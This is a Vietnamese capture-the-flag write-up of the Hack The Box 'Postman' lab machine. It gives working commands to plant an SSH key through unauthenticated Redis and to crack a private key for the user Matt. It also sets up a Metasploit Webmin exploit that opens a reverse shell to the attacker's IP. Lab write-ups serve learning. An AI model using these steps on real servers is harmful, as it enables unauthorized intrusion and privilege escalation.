## 0. Mở đầu
> Do policy của Hackthebox là không share public write-up nên rất tiếc sẽ không có public write-up tiếp theo ! Để theo dõi các bạn có thể truy cập vào [đây ](https://kgcg.wordpress.com/)với password  **Sun*Security** để đọc write-up.

Tiếp nối bài viết [giới thiệu](https://viblo.asia/p/ban-muon-tap-lam-hacker-hay-thu-choi-cac-machine-tren-hackthebox-3P0lPnwPKox) về Machine trên Hackthebox, đây là write-up của mình về một machine hiện đang **Ready** trên Hackthebox. Hi vọng qua bài write-up các bạn sẽ có một cái nhìn cơ bản về cách tiếp cận và chơi Hackthebox.

Việc đặt tiêu đề là Write-up thay vì Walk Through phần nào thể hiện rằng bài viết sẽ tập trung trực tiếp vào việc tìm ra Flag. Tuy nhiên mình sẽ cố gắng giải thích trong quá trình viết write-up.

Việc đọc write-up khi chưa cố gắng tấn công Machine là không được khuyến khích!

## 1. Về Machine

**Tại sao lại là Postman?** 
Đây là 1 machine dễ, với việc ít phải custom, sẽ là 1 ví dụ rất tốt để các bạn bắt đầu tìm hiểu làm thế nào để có thể Root một "box" !

![](https://images.viblo.asia/1ce56e70-81c2-4219-a667-e0e36239f483.png)



Postman là một machine với OS nhân Linux, được rating là một machine ở mức độ **Easy**, khi Root thành công bạn sẽ có 20 điểm, còn User Own bạn sẽ có 10 điểm, tổng cộng là 30 điểm. Machine được publish 2/11/2019 và có IP là 10.10.10.160

![](https://images.viblo.asia/00307355-eab4-4a32-9488-614e24c9f4af.png)


Nhận định ban đầu: Chúng ta có thể đoán rằng 2 việc quan trọng nhất đó là tìm kiếm càng nhiều thông tin về các ports, service hay URLs của machine càng tốt, ngoài ra chắc chắn machine có "liên quan" tới một hay một số CVE nào đó. <br>
Ngoài ra việc có được Flag của User có vẻ không quá khó khăn khi việc Custom Expoitation gần như bằng 0.


## 2. Write-up
### 2.1 User Flag 
Scan ports và services với nmap:
> **sudo nmap -Pn -sV -O -p-  10.10.10.160** <br><br>
![](https://images.viblo.asia/e0da6e32-f6c3-42ea-9949-c89e3125d60e.png)


Có port 22 (SSH), 80 (HTTP), 6379 (Redis) và 10000 (Webmin httpd) đang mở và có service chạy<br><br>
Công việc tiếp theo là search những service đang chạy trên các ports đó có xem lỗ hổng hay không. Khả năng cao là sẽ có vì matrix rate của machine rất thiên về hướng CVE:
> **searchsploit Redis**<br>
> **searchsploit Webmin 1.910**<br><br>
![](https://images.viblo.asia/216e4f63-749f-4e6b-bfbc-76057a10a935.png)

Cả 2 lỗ hổng đều có thể dẫn tới việc thực thi lệnh, tuy nhiên khi tìm hiểu module expoloit của Webmin 1.910, có yêu cầu username / password, còn Redis thì không. Vậy nên chúng ta sẽ tập trung vào port 6379 trước.

Tham khảo việc pentesting Redis [tại đây](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis).

Install redis-tools: 
```
sudo apt-get install redis-tools
```
Connect tới redis trên server mà không cần authen và lấy những thông tin có thể:
```
redis-cli -h 10.10.10.160
10.10.10.160:6379> info
10.10.10.160:6379> CONFIG GET *
```

![](https://images.viblo.asia/b2808403-1286-4c11-9efd-b627dad53c19.png)
Chúng ta có được đường dẫn .ssh của redis, tức là nếu chúng ta có thể ghi vào đây một ssh public key, chúng ta có thể dùng private key để authen và ssh vào dưới tên redis.
Tự tạo một cặp public key - private key và đẩy lên theo hướng dẫn pentesting ở link trên:

```
ssh-keygen -t rsa
(echo -e "\n\n"; cat ./id_rsa.pub; echo -e "\n\n") > foo.txt
cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
```
Lưu public key vào "authorized_keys" trên redis server, lưu ý chúng ta chỉ có quyền với /var/lib/redis/.ssh
![](https://images.viblo.asia/60b52075-d98b-4680-8698-96585be31881.png)

Từ đây ta só thể ssh dễ dàng. Có vẻ sẽ có User flag ngay tại đây.
![](https://images.viblo.asia/12c77e1f-9f06-4956-a6df-34ccbf9b0e94.png)

Nhưng cuộc đời không như mơ và cuộc sống không dễ thở:
![](https://images.viblo.asia/c27a5b35-ce30-4b78-ae51-90587954feb7.png)

Với việc port 22 mở, chúng ta có thể suy đoán rằng cần phải ssh tới Web Server qua port 22 với User **Matt** để có được user flag. <br>
Sau khi dò dẫm, chúng ta thấy 1 **.bak** file đáng ngờ trong **/opt/**, theo thông tin có thể suy đoán đây là private key của **Matt**. 

Nhưng cuộc sống lại không như mơ và cuộc đời lại không dễ thở, có vẻ là **.bak** file nên không thể dùng nó để ssh được nữa. <br>Thử 
Decrypt với John:<br><br>
   ![](https://images.viblo.asia/d1e76349-b94c-4cc8-b24c-0e1eb68c87b9.png)

Chúng ta có password của Matt: **computer2008**. Chúng ta dùng để cat flag :v:

![](https://images.viblo.asia/16c08b64-7e45-4cfc-807a-e16707999c96.jpg)

### 2.2 Root Flag
Có lẽ đây là lúc sử dụng đến port 10000 ban nãy, hãy xem thử module của metasploit về lỗ hổng trên **Webmin 1.910**:<br><br>
![](https://images.viblo.asia/0df73480-c01e-450a-b4e0-6a4df192590e.png)

Command:
```
set RHOSTS 10.10.10.160
set USERNAME Matt
set PASSWORD computer2008
set LHOST: 10.10.15.156
set LPORT: 4443
set SSL True
exploit
```
Trong đó: **LHOST** là ip của chúng ta được cấp khi connect qua OpenVPN và phải set **SSL True** vì khi truy cập vào đây sẽ qua HTTPS:
![](https://images.viblo.asia/b97870c6-8684-4901-ae67-1c6a7623d4b9.png)

Đã có root thì chỉ việc cat root flag:
![](https://images.viblo.asia/bf3bc8f6-7771-45f1-ad2f-7b4bbb257e60.png)

![](https://images.viblo.asia/3583981a-faa4-48cb-ba59-566ab5983442.jpg)

## 3. Kết luận
Đây là một machine phù hợp với người mới bắt đầu, có nhiều thử thách nhỏ để giải quyết thử thách lớn ( có flag ). Từ đó người chơi có thể có thêm nhiều kiến thức mới.

Qua bài write-up, hi vọng các bạn có được một cái nhìn cơ bản về việc làm thế nào để có được flag trong 1 machine trên Hackthebox, cũng như một số kỹ năng và kiến thức cơ bản cần dùng !